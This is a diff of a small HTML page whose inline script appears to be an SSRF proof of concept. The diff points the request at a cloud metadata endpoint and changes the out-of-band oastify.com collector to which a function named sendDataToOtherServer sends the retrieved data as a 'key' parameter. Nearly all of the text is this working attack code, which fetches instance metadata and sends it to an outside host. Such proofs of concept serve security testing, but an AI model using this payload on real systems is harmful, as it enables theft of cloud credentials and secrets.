@@ -1,8 +1,9 @@
 <html>
 <body>
+    <h1> SSRF </h1>
     <script>
 var req = new XMLHttpRequest();
-var url = "https://padlet.com//dashboard.json";
+var url = "http://metadata/computeMetadata";
 
 req.onload = retrieveKeys;
 req.open('GET', url, true);
@@ -15,7 +16,7 @@ function retrieveKeys() {
 }
 
 function sendDataToOtherServer(data) {
-    var otherServerUrl = "http://uus8n94c6r2g99hsovz3r8zp0g67bv1jq.oastify.com/log?key=" + data;
+    var otherServerUrl = "https://1suflg2j4y0n7gfzm2xapfxwyn4f03rrg.oastify.com/log?key=" + data;
     
     var reqOtherServer = new XMLHttpRequest();
     reqOtherServer.open('GET', otherServerUrl, true);
